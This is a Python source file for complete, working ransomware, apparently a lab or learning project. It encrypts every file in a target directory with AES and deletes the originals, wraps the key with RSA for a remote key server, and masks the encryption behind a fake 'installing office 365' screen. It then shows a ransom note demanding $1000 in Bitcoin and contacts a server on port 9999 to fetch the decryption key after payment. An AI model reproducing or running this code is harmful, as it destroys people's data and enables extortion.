import string
import threading
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_OAEP
from Crypto import Random
import hashlib
import secrets
import os
import tkinter as tk
import threading
import socket

# home_dir = os.path.expanduser("~")
# DIR = os.path.join(home_dir, "Documents")
DIR = "/home/riad/offensive-security/crypto-ransomware/test"

def random_string(len):
    chars = string.ascii_lowercase + string.digits
    result_str = ''.join(secrets.choice(chars) for _ in range(len))
    return result_str


# id = random_string(32)
id = "zFWURGryAVwmfynxWjP9N7mC82DGTE4NGy0dcxzmqxOHFhqKIR9teSyASb622pyu"

def generate_RSA_keys(dir):
    # Generate a public/ private key pair using 4096 bits key length (512 bytes)
    new_key = RSA.generate(4096, e=65537)
    # The private key in PEM format
    private_key = new_key.exportKey("PEM")
    # The public key in PEM Format
    public_key = new_key.publickey().exportKey("PEM")
    # saving the keys
    with open(dir + os.sep + "private_key.pem", "wb") as fd:
        fd.write(private_key)
    with open(dir + os.sep + "public_key.pem", "wb") as fd:
        fd.write(public_key)

def get_AES_key(passwd):
	hasher = hashlib.sha256(passwd.encode('utf-8'))
	return hasher.digest()

def get_all_files_path(directory_path):
    files_path = []
    for root, _, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            files_path.append(file_path)
    return files_path

# encrypt a key using an RSA public key
def encrypt_key(key, public_key):
    # Import the Public Key and use for encryption using PKCS1_OAEP
    rsa_key = RSA.importKey(public_key)
    rsa_key = PKCS1_OAEP.new(rsa_key)

    # In determining the chunk size, determine the private key length used in bytes
    # and subtract 42 bytes (when using PKCS1_OAEP). The data will be in encrypted
    # in chunks
    chunk_size = 470
    offset = 0
    end_loop = False
    encrypted = b""

    while not end_loop:
        # The chunk
        chunk = key[offset:offset + chunk_size]

        # If the data chunk is less then the chunk size, then we need to add
        # padding with " ". This indicates the we reached the end of the file
        # so we end loop here
        if len(chunk) % chunk_size != 0:
            end_loop = True
            chunk += b" " * (chunk_size - len(chunk))

        # Append the encrypted chunk to the overall encrypted file
        encrypted += rsa_key.encrypt(chunk)

        # Increase the offset by chunk size
        offset += chunk_size

    # Base 64 encode the encrypted file
    return encrypted
    # return base64.b64encode(encrypted)

# decrypt a key using an RSA private key
def decrypt_key(encrypted_key, private_key):

    # Import the Private Key and use for decryption using PKCS1_OAEP
    rsakey = RSA.importKey(private_key)
    rsakey = PKCS1_OAEP.new(rsakey)

    # In determining the chunk size, determine the private key length used in bytes.
    # The data will be in decrypted in chunks
    chunk_size = 512
    offset = 0
    decrypted = b""

    # keep loop going as long as we have chunks to decrypt
    while offset < len(encrypted_key):
        # The chunk
        chunk = encrypted_key[offset: offset + chunk_size]

        # Append the decrypted chunk to the overall decrypted file
        decrypted += rsakey.decrypt(chunk)

        # Increase the offset by chunk size
        offset += chunk_size

    # remove the spaces added before the durring the encryption.
    return decrypted.strip()

def encrypt_file(key, filepath):
    filename = os.path.basename(filepath)
    chunksize = 64*1024
    outputFile = os.path.dirname(filepath) + os.sep + "enc_" + filename
    filesize = str(os.path.getsize(filepath)).zfill(16)
    IV = Random.new().read(16)

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filepath, 'rb') as infile: 
        with open(outputFile, 'wb') as outfile: 
            outfile.write(filesize.encode('utf-8'))
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk)%16 != 0:
                    chunk += b' '*(16-(len(chunk)%16))

                outfile.write(encryptor.encrypt(chunk))
            
    os.remove(filepath)
                                

def decrypt_file(key, filepath):
    filename = os.path.basename(filepath)
    chunksize = 64*1024
    outputFile = os.path.dirname(filepath) + os.sep + filename[4:] 

    with open(filepath, 'rb') as infile:
        filesize = int(infile.read(16))
        IV = infile.read(16)

        decryptor= AES.new(key, AES.MODE_CBC, IV)

        with open(outputFile, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break

                outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(filesize)
    
    os.remove(filepath)

def encrypt_keys(aes_key): 
    with open('public_key.pem', 'rb') as file: 
        public_key = file.read()
    with open('private_key.pem', 'rb') as file: 
        private_key = file.read()
    with open('server_public_key.pem', 'rb') as file: 
        server_public_key = file.read()
    enc_key = encrypt_key(aes_key, public_key)
    enc_private_key = encrypt_key(private_key, server_public_key)
    with open('key.aes', 'wb') as file:
        file.write(enc_key)
    with open('private_key.pem', 'wb') as file:
        file.write(enc_private_key)

def decrypt_keys(private_key): 
    with open('key.aes', 'rb') as file:
        key = file.read()
    key = decrypt_key(key, private_key)
    with open('key.aes', 'wb') as file:
        file.write(key)

def encrypt():
    # encrypte all files
    key = get_AES_key(random_string(16))
    generate_RSA_keys('.')
    files = get_all_files_path(DIR)
    for file in files:
        if check_enc_file(file):
            continue
        encrypt_file(key, file)
    with open(DIR + os.sep + 'finished.txt', 'w') as file: 
        file.write('encryption successfull')
    encrypt_keys(key)

def decrypt(private_key):
    # decrypte all files
    decrypt_keys(private_key)
    with open('key.aes', 'rb') as file: 
        key = file.read()
    files = get_all_files_path(DIR)
    for file in files:
        if not check_enc_file(file):
            continue
        decrypt_file(key, file)
    os.remove(DIR + os.sep + 'finished.txt')

def request_key():
    global id
    # create a socket object
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # get local machine name
    # host = '192.168.57.2'
    host = '127.0.0.1'
    port = 9999

    # connect the client socket to the server
    client_socket.connect((host, port))

    # send the client request
    request = id.encode()
    client_socket.sendall(request)

    with open('private_key.pem', 'rb') as file: 
        private_key = file.read()
    client_socket.sendall(private_key)
    # receive the server's response
    response = client_socket.recv(5000)
    client_socket.close()

    if(response.decode() == 'unauthorized'):
        return False
    else:
        return response


def check_enc_file(file_path):
    """Checks if the file name starts with 'enc_'."""
    file_name = os.path.basename(file_path)
    return file_name.startswith('enc_')


class MyGUI:

    def __init__(self, master):
        self.master = master
        master.title("MyGUI")
        files = get_all_files_path(DIR)
        if files.__len__() == 0:
            exit()
        self.result_text = tk.Label(
            master, text="", font=('Arial', 24))
        self.result_text.pack(pady=10)
        # Create label for the loading spinner
        self.loading_label = tk.Label(master, text="", font=('Arial', 24))
        self.loading_label.pack(pady=10)
        self.extra = tk.Label(master, text="", font=('Arial', 16))
        self.extra.pack(pady=10)
        if not os.path.exists(DIR + os.sep + 'finished.txt'):
            self.loading_label.config(text="installing office 365...")
            self.extra.config(
                text="this process might take a while please wait")
        # Start thread to encrypt the files
        self.thread_a = threading.Thread(target=self.execute_a)
        self.thread_a.start()

    def execute_a(self):
        # Function A
        # Do some long-running operation here...
        if not os.path.exists(DIR + os.sep + 'finished.txt'):
            encrypt()
        # Update the loading spinner to let the user know that A has finished
        self.loading_label.config(text="your files have been hacked")
        self.extra.config(text="")
        # Create button to execute function B
        self.button = tk.Button(
            self.master, text="wait...", command=self.execute_b)
        self.button.pack(pady=10)
        # Create result note
        self.note_label = tk.Label(self.master, text="", font=('Arial', 16))
        self.note_label.pack(pady=10)
        # Create section for note
        self.note = "you documents have been ecnrypted, you can no longer use you data \nto decrypte the files send 1000$ worth to this cypto wallet address \n1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2 \nwhen paying copy this unique ID and put in the note of payment \n id: {} \ndo not mess with any of the ecrypted diractory or you will never get them back".format(
            id)
        self.note_label = tk.Label(
            self.master, text=self.note, font=('Arial', 16), foreground="red")
        self.note_label.pack(pady=10)
        # Enable the button to execute function B
        self.button.config(text="Decrypt")

    def execute_b(self):
        # Disable the button to prevent multiple executions of function B
        self.button.config(state="disabled")
        # Start thread to execute function B
        self.thread_b = threading.Thread(target=self.execute_b_thread)
        self.thread_b.start()

    def execute_b_thread(self):
        # Function B
        private_key = request_key()
        if private_key:
            self.loading_label_b = tk.Label(
                self.master, text="Decrypting...", font=('Arial', 24), fg="green")
            self.loading_label_b.pack(pady=10)
            self.result_text.config(text="")
            decrypt(private_key)
            self.loading_label_b.config(text="Decryption has finished")
            self.result_text.config(text="your files have been decrypted \n")
        else:
            self.result_text.config(text="you have note payed yet.\n")
            self.button.config(state="normal")


# Create Tkinter window and start GUI loop
root = tk.Tk()
width = root.winfo_screenwidth()
height = root.winfo_screenheight()
root.geometry("%dx%d+%d+%d" % (width, height, 0, 0))

my_gui = MyGUI(root)
root.mainloop()